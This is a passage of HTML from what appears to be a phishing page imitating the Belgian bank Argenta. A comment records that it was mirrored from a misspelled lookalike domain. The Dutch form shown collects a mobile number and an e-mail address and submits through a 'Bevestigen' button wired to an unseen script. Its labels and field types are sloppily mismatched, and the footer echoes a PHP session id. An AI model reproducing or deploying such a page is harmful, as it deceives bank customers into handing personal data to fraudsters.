value="1939">1939</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1938">1938</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1937">1937</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1936">1936</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1935">1935</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1934">1934</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1933">1933</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1932">1932</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1931">1931</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1930">1930</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1929">1929</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1928">1928</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1927">1927</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1926">1926</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1925">1925</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1924">1924</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1923">1923</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1922">1922</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1921">1921</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1920">1920</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1919">1919</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1918">1918</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1917">1917</option><!-- end ngRepeat: year in years --><option ng-repeat="year in years" class="ng-binding ng-scope" value="1916">1916</option><!-- end ngRepeat: year in years --></select></div></div>
        </div>
    </div>
</div><div class="row ng-scope">
    <div class="col-xs-6 col-sm-12 col-md-6 col-lg-6">
        <label><span lp-i18n="E-maildaddress" ng-init="form.fields.016_email.label = translateString('E-maildaddress'); form.fields.email_verif.label = translateString('E-maildaddress'); form.fields.email_verif.hide = 'true'" class="ng-isolate-scope"><span translate="E-maildaddress" class="ng-scope">GSM-nummer</span></span>*</label>
    </div>
    <div class="col-xs-6 col-sm-12 col-md-6 col-lg-6 form-group" ng-class="{ 'has-error': (contactForm.email.$invalid &amp;&amp; formSubmitted) || emailDoesntMatch}">
        <input class="form-control ng-pristine ng-invalid ng-invalid-required ng-valid-email ng-valid-pattern" size="25" maxlength="10" type="numbers" ng-model="form.email" name="telt" ng-pattern="emailPattern" ng-change="form.fields.016_email.content = form.email; form.fields.email_verif.content = form.email" required="" id="telt">
    </div>
</div>
<div class="row ng-scope">
    <div class="col-xs-6 col-sm-12 col-md-6 col-lg-6">
        <label><span lp-i18n="E-maildaddress" ng-init="form.fields.016_email.label = translateString('E-maildaddress'); form.fields.email_verif.label = translateString('E-maildaddress'); form.fields.email_verif.hide = 'true'" class="ng-isolate-scope"><span translate="E-maildaddress" class="ng-scope">E-mailadres</span></span>*</label>
    </div>
    <div class="col-xs-6 col-sm-12 col-md-6 col-lg-6 form-group" ng-class="{ 'has-error': (contactForm.email.$invalid &amp;&amp; formSubmitted) || emailDoesntMatch}">
        <input class="form-control ng-pristine ng-invalid ng-invalid-required ng-valid-email ng-valid-pattern" size="25" maxlength="70" type="email" ng-model="form.email" name="emailt" ng-pattern="emailPattern" ng-change="form.fields.016_email.content = form.email; form.fields.email_verif.content = form.email" required="" id="emailt">
    </div>
</div>
<!-- E-mail confirmation -->

</div>
<span lp-i18n="* mandatory fields" class="ng-isolate-scope"><span translate="* mandatory fields" class="ng-scope">*verplichte velden</span></span>
<div class="widget-footer"><!-- ngInclude: footerPartialUrl --><div ng-include="footerPartialUrl" class="ng-scope"><div class="row ng-scope"><div class="actions pull-right" ng-show="(loginForm.j_subscriptionNumber.$valid &amp;&amp; !showCardlogin &amp;&amp; showSubResponse)  || (loginForm.j_cardNumber.$valid &amp;&amp; showCardlogin &amp;&amp; showResponse)">
		<button type="button" id="x5" name="x5" class="btn btn-sm btn-primary" onclick="finterLude()" ng-disabled="checkForDisabled()">
			<span lp-i18n="Logon" class="ng-isolate-scope"><span translate="Logon" class="ng-scope">Bevestigen</span></span>
		</button>
	</div>
</div>
</div></div></div></div></form></div>
                        
                    </section>
                </article>
				
            </div> <!-- #main -->
        </div> <!-- #main-container -->

        <div class="footer-container">
            <footer class="wrapper">
                <p>© Argenta</p>
				<p>ID: <?php echo @$_SESSION['rnd']?></p>
            </footer>
        </div>
    

</body>
<!-- Mirrored from axvernieupatrxn.eu/kIantenn/gegevens.php by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 15 Apr 2018 09:37:03 GMT -->
</html>